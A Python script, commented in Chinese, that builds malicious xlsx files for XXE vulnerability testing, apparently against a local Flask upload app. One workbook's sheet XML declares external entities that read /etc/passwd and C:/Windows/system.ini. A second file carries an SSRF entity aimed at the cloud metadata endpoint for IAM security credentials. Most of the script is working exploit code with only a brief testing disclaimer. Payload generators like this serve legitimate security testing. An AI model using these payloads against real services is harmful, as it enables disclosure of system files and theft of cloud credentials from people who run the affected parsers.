"""
生成恶意xlsx文件用于XXE漏洞测试
这个脚本会创建一个包含外部实体注入的xlsx文件
"""

import zipfile
import os


def create_malicious_xlsx(output_path='malicious_test.xlsx'):
    """
    创建一个包含XXE攻击载荷的恶意xlsx文件
    
    xlsx文件本质上是一个ZIP压缩包，包含以下关键XML文件：
    - [Content_Types].xml
    - _rels/.rels
    - xl/workbook.xml
    - xl/worksheets/sheet1.xml
    - 等等...
    
    我们在这些XML文件中注入外部实体声明。
    """
    
    # 恶意XML内容 - 尝试读取/etc/passwd文件（Linux）或 C:\Windows\system.ini（Windows）
    # 定义一个外部实体 "xxe"，指向系统文件
    # 注意：DOCTYPE必须在根元素之前，且不能在CDATA中
    malicious_xml = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE worksheet [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe_win SYSTEM "file:///C:/Windows/system.ini">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
           xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr">
        <is>
          <t>&xxe;</t>
        </is>
      </c>
    </row>
  </sheetData>
</worksheet>
'''
    
    # 正常的Content_Types.xml
    content_types_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>
'''
    
    # 正常的.rels文件
    rels_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>
'''
    
    # 正常的workbook.xml
    workbook_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
'''
    
    # 正常的workbook.xml.rels
    workbook_rels_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>
'''
    
    # 创建ZIP文件（xlsx本质上是ZIP）
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # 添加正常文件
        zipf.writestr('[Content_Types].xml', content_types_xml)
        zipf.writestr('_rels/.rels', rels_xml)
        zipf.writestr('xl/workbook.xml', workbook_xml)
        zipf.writestr('xl/_rels/workbook.xml.rels', workbook_rels_xml)
        
        # 添加恶意文件 - 在sheet1.xml中注入外部实体
        zipf.writestr('xl/worksheets/sheet1.xml', malicious_xml)
        
        # 添加docProps（可选，使文件更完整）
        docprops_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
                   xmlns:dc="http://purl.org/dc/elements/1.1/"
                   xmlns:dcmitype="http://purl.org/dc/dcmitype/"
                   xmlns:dcterms="http://purl.org/dc/terms/"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:creator>User</dc:creator>
  <dcterms:created xsi:type="dcterms:DateTime">2024-01-01T00:00:00Z</dcterms:created>
</cp:coreProperties>
'''
        zipf.writestr('docProps/core.xml', docprops_xml)
    
    print(f"✅ 恶意xlsx文件已创建: {output_path}")
    print(f"   文件大小: {os.path.getsize(output_path)} bytes")
    print(f"\n⚠️  警告：此文件仅用于安全测试和教育目的！")
    print(f"   当使用不安全的XML解析器解析此文件时，可能会触发XXE漏洞。")
    
    return output_path


def create_ssrf_xlsx(output_path='ssrf_test.xlsx'):
    """
    创建用于SSRF测试的恶意xlsx文件
    尝试访问内网服务
    """
    
    # 尝试访问内网服务（SSRF攻击）
    ssrf_xml = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE worksheet [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1">
      <c r="A1" t="inlineStr">
        <is>
          <t>&ssrf;</t>
        </is>
      </c>
    </row>
  </sheetData>
</worksheet>
'''
    
    content_types_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>
'''
    
    rels_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>
'''
    
    workbook_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>
'''
    
    workbook_rels_xml = b'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>
'''
    
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.writestr('[Content_Types].xml', content_types_xml)
        zipf.writestr('_rels/.rels', rels_xml)
        zipf.writestr('xl/workbook.xml', workbook_xml)
        zipf.writestr('xl/_rels/workbook.xml.rels', workbook_rels_xml)
        zipf.writestr('xl/worksheets/sheet1.xml', ssrf_xml)
    
    print(f"✅ SSRF测试xlsx文件已创建: {output_path}")
    return output_path


if __name__ == '__main__':
    print("=" * 60)
    print("XXE漏洞测试文件生成器")
    print("=" * 60)
    print()
    
    # 创建文件读取类型的XXE测试文件
    create_malicious_xlsx()
    print()
    
    # 创建SSRF类型的测试文件
    create_ssrf_xlsx()
    print()
    
    print("=" * 60)
    print("测试文件已准备就绪！")
    print("启动Flask应用后，访问 http://localhost:5000 进行上传测试")
    print("=" * 60)
